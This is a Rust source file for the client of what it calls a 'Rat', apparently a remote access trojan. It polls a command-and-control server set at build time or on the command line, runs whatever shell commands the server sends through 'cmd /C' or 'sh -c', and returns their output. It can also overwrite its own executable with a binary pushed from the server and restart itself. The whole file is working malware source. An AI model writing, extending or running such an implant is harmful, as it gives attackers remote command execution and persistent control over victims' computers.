use crate::connector::{Connector, HttpsConnector};
use crate::error::RatError;
use anyhow::{anyhow, Result};
use common::{Message, Notification, Task};
use log::{debug, error};
#[cfg(not(target_os = "windows"))]
use std::os::unix::process::CommandExt;

// Sleep values in milliseconds
// #[derive(Clone, Copy)]
// enum SleepSchedule {
//     Hyperactive = 0,
//     Focused = 1000,                 // 1 second
//     Active = 5000,                  // 5 seconds
//     Aware = 1000 * 60,              // 1 minute
//     Idle = 1000 * 60 * 30,          // 30 minutes
//     Sleeping = 1000 * 60 * 60,      // 1 hour
//     DeepSleep = 1000 * 60 * 60 * 8, // 8 hours
// }

pub struct Rat {
    connector: Connector,
    // sleep_schedule: SleepSchedule,
    sleep_schedule: u64,
}

impl Rat {
    pub fn new() -> Result<Self> {
        let url = std::env::args()
            .nth(1)
            .unwrap_or(std::env!("IP_ADDRESS").to_string());
        Ok(Self {
            connector: Connector::new(Box::new(HttpsConnector::new(url.clone())?)),
            // sleep_schedule: SleepSchedule::Active,
            sleep_schedule: 5000,
        })
    }

    pub(crate) async fn start(&mut self) -> Result<()> {
        self.connect().await?;
        self.run().await
    }

    async fn connect(&mut self) -> Result<()> {
        loop {
            match self.connector.connect().await {
                Ok(_) => break,
                Err(e) => error!("Error: {}", e),
            }
            std::thread::sleep(std::time::Duration::from_millis(self.sleep_schedule as u64));
        }
        Ok(())
    }

    async fn run(&mut self) -> Result<()> {
        let mut notification = Notification::Empty;
        loop {
            notification = match self.connector.send(&notification).await {
                Ok(message) => match message {
                    Message::BananaBread => Notification::Empty, //debug!("No task"),
                    Message::Job { id, task } => self.handle_task(id, task).await,
                    Message::Update(bytes) => self.update(&bytes).unwrap(),
                    Message::Exit => break,
                },
                Err(re) => {
                    match re {
                        RatError::Unauthorized => {
                            debug!("Unauthorized");
                            self.connect().await?;
                        }
                        RatError::Error(e) => error!("Reception error: {}", e),
                    }
                    Notification::Empty
                }
            };
            std::thread::sleep(std::time::Duration::from_millis(self.sleep_schedule as u64));
        }
        debug!("Exit");
        self.connector.disconnect().await?;
        Ok(())
    }

    async fn handle_task(&mut self, id: i32, task: Task) -> Notification {
        let Task::Command { command } = task;
        debug!("Task: {} {:?}", id, command);
        let now = chrono::Utc::now();
        #[cfg(target_os = "windows")]
        let output = std::process::Command::new("cmd")
            .args(&["/C", command.as_str()])
            .output();
        #[cfg(not(target_os = "windows"))]
        let output = std::process::Command::new("sh")
            .arg("-c")
            .arg(command)
            .output();
        match output
            .map(|output| Notification::Result {
                job_id: id,
                completed_at: now,
                result: Ok(String::from_utf8_lossy(&output.stdout).to_string()),
            })
            .map_err(|e| Notification::Result {
                job_id: id,
                completed_at: now,
                result: Err(format!("{}", e)),
            }) {
            Ok(result) => result,
            Err(e) => e,
        }
    }

    fn update(&mut self, bytes: &[u8]) -> Result<Notification> {
        debug!("Update");
        let current_exe = std::env::current_exe().unwrap();
        let mut updated_exe = current_exe.clone();
        updated_exe.set_file_name("updt.bin");
        let mut tmp_exe = current_exe.clone();
        tmp_exe.set_file_name("tmp.bin");

        std::fs::write(&updated_exe, bytes).unwrap();
        std::fs::rename(current_exe.as_path(), tmp_exe.as_path())?;
        if let Err(e) = std::fs::rename(updated_exe.as_path(), current_exe.as_path()) {
            std::fs::rename(tmp_exe.as_path(), current_exe.as_path())?;
            return Err(anyhow!(e));
        }
        std::fs::remove_file(tmp_exe)?;

        // https://www.reddit.com/r/rust/comments/et01h2/is_possible_to_rerun_current_process_windows/
        let args = std::env::args().skip(1).collect::<Vec<_>>();
        #[cfg(target_os = "windows")]
        {
            std::process::Command::new(std::env::current_exe()?)
                .args(args)
                .spawn()?
                .wait()?;
            std::process::exit(0);
        }
        // Linux -> https://stackoverflow.com/questions/65969353/how-do-i-fork-exec-a-process-which-forwards-all-arguments-in-rust
        #[cfg(not(target_os = "windows"))]
        {
            error!(
                "Update error: {}",
                std::process::Command::new(std::env::current_exe()?)
                    .args(args)
                    .exec()
            );
            Ok(Notification::Empty)
        }
    }
}
